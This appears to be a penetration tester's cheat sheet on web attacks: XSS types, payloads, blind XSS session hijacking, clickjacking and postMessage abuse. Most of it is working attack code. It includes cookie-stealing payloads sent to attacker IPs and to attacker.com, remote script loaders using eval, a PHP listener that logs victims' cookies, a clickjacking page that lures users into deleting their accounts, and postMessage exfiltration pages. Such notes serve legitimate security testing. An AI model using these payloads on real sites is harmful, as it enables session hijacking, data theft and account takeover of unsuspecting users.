
## Table of Contents:

- [[#Types of XSS]]
- [[#Automated tools]]
- [[#Automated tools]]
- [[#Payloads]]
- [[#Blind XSS to Session Hijacking]]
- [[#Clickjacking]]
- [[#PostMessage Abuse]]

---
## Types of XSS
| Type                                    | Description                                                                                                                                                                                                                                  |
| --------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Stored (Persistent) XSS`               | Occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)                                                                                                                        |
| `Reflected (Non-Persistent) XSS`        | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)                                                                                 |
| `Document Object Model (DOM) based XSS` | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags) |

---

## Automated tools

Some of the common open-source tools that can assist us in XSS discovery are [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser), [Dalfox](https://github.com/hahwul/dalfox)

```shell
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```

---

## Payloads

```html
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>
<script>print()</script>
<img src="" onerror=alert(window.origin)>
' onerror=alert(1)><
'><script>alert(1)</script>
"><script>alert(1)</script>
"><script>new Image().src='http://10.10.15.104/index.php?c='+document.cookie</script>
```

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) and [PayloadBox](https://github.com/payloadbox/xss-payload-list).

---

## Blind XSS to Session Hijacking

#### Loading a Remote Script to identify vulnerable field

```html
<script src="http://OUR_IP/script.js"></script>

# We can use these payloads to know which field is vul sending it back to us 
<script src="http://OUR_IP/username"></script>
<script src="http://OUR_IP/password"></script>
<script src="http://OUR_IP/Text"></script>
```
#### Payload to test

```html
<script src=http://OUR_IP></script>

'><script src=http://OUR_IP></script>

"><script src=http://OUR_IP></script>

javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>

<script>$.getScript("http://OUR_IP")</script>
```

#### Create PHP web server

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

#### Starting the server

```shell
mkdir server
cd server
vim index.php # write php server
sudo php -S 0.0.0.0:80 
```

#### Session hijacking

Put one of these payload inside XSS payloads
```js
<script>document.location='http://OUR_IP/index.php?c='+document.cookie</script>
<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>
<img src="x" onerror="fetch('http://OUR_IP/index.php?c='document.cookie)">
```

```javascript
"><script>new Image().src='http://10.10.15.104/index.php?c='+document.cookie</script>
```

#### Tips

```Note
To see updated source code with DOM XSS: We can still view the rendered page source with the Web Inspector tool by clicking `CTRL+SHIFT+C`
```


If there is no sanitization after these functions there will be a `DOM XSS`:
- `document.write()`
- `DOM.innerHTML`
- `DOM.outerHTML`


```javascript
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

*Note*: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).

---

## Clickjacking

Target page loads in an iframe and has sensitive actions (clicks, form submissions)
#### Check if framing is allowed
 
```bash
# Check response headers
curl -I https://target.com | grep -i "x-frame-options\|content-security-policy"

# X-Frame-Options: DENY or SAMEORIGIN = protected
# Missing header or ALLOW-FROM = vulnerable
# CSP frame-ancestors 'none' or 'self' = protected
```

####  Basic framing test

```html
<!-- Save as test.html and open in browser -->
<!-- If target loads inside iframe = vulnerable -->
<iframe src="https://target.com" width="800" height="600"></iframe>
```

#### Clickjacking PoC

```html
<!-- Overlay transparent iframe over fake button -->
<!DOCTYPE html>
<html>
<head>
  <style>
    .container {
      position: relative;
      width: 800px;
      height: 600px;
    }
    .fake-button {
      position: absolute;
      top: 340px;      /* align with target button */
      left: 200px;
      z-index: 1;
      background: #28a745;
      color: white;
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
    }
    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 0.0;    /* set to 0.5 to align, then 0.0 for attack */
      z-index: 2;
    }
  </style>
</head>
<body>
  <div class="container">
    <button class="fake-button">Click here to win a prize!</button>
    <iframe src="https://target.com/account/delete"></iframe>
  </div>
</body>
</html>
```

#### Clickjacking to XSS (if input fields are present)

```html
<!-- Pre-fill form fields via URL params then overlay -->
<iframe src="https://target.com/profile?email=attacker@evil.com"></iframe>
```

#### Tips:
- [ ] Test if URL parameters pre-fill form fields that increases impact
- [ ] Check if SameSite cookie attribute prevents session use in iframe

---

## PostMessage Abuse

Target uses iframes, cross-origin communication, or browser extensions

#### Find message listeners

```javascript
// In browser DevTools console:
// Check Sources → Global Listeners → message
// Lists all registered message event handlers

// Or grep JS files
cat app.js | grep -E "addEventListener\s*\([\"']message[\"']"
cat app.js | grep -E "window\.addEventListener.*message"
cat app.js | grep -E "postMessage\s*\("
```

#### Analyze the listener

```javascript
// Vulnerable — no origin check
window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data;
});

// Vulnerable — weak origin check
window.addEventListener('message', function(e) {
    if (e.origin.includes('target.com')) {  // bypassable with attacker-target.com
        document.getElementById('output').innerHTML = e.data;
    }
});

// Secure — strict origin check
window.addEventListener('message', function(e) {
    if (e.origin !== 'https://target.com') return;
    // process message
});
```

#### XSS via postMessage (no/weak origin check)

```html
<!-- Host on attacker server -->
<!DOCTYPE html>
<html>
<body>
<script>
  // Open target in new window or iframe
  var target = window.open('https://target.com');

  // Wait for page to load then send malicious message
  setTimeout(function() {
    target.postMessage('<img src=x onerror=alert(document.cookie)>', '*');
  }, 2000);
</script>
</body>
</html>
```

#### Data exfiltration via postMessage

```html
<!-- If target sends sensitive data via postMessage to any origin -->
<!DOCTYPE html>
<html>
<body>
<iframe src="https://target.com/dashboard"></iframe>
<script>
  // Listen for any messages sent by target
  window.addEventListener('message', function(e) {
    console.log('Origin:', e.origin);
    console.log('Data:', e.data);
    // Exfil to attacker server
    fetch('https://attacker.com/log?data=' + btoa(JSON.stringify(e.data)));
  });
</script>
</body>
</html>
```

#### Origin bypass techniques

```javascript
// If check is: e.origin.includes('target.com')
// Host PoC on: https://attacker-target.com or https://target.com.attacker.com
      
// If check is: e.origin.startsWith('https://target')  
// Host PoC on: https://target.attacker.com

// If check uses regex without anchors: /target\.com/
// Host PoC on: https://attacker.com?x=target.com
```

#### DOM XSS sinks to look for after postMessage

```javascript
// After message received, look for these dangerous sinks:
element.innerHTML = e.data           // XSS
element.outerHTML = e.data           // XSS
document.write(e.data)               // XSS
eval(e.data)                         // RCE in browser
location.href = e.data               // Open redirect / XSS
location = e.data                    // Open redirect
window.open(e.data)                  // Open redirect
element.src = e.data                 // XSS if javascript: allowed
```

**Checklist:**
- [ ] Find all `addEventListener('message')` handlers in JS files
- [ ] Check DevTools Sources -> Global Listeners -> message
- [ ] Analyze origin validation for missing, weak, or bypassable
- [ ] Identify what the handler does with `e.data` to find dangerous sinks
- [ ] Build PoC iframe/popup page and send malicious postMessage
- [ ] Test origin bypass if weak check exists
- [ ] Check if target sends sensitive data via postMessage to `*`
- [ ] Look for authentication tokens or PII in outgoing postMessages

---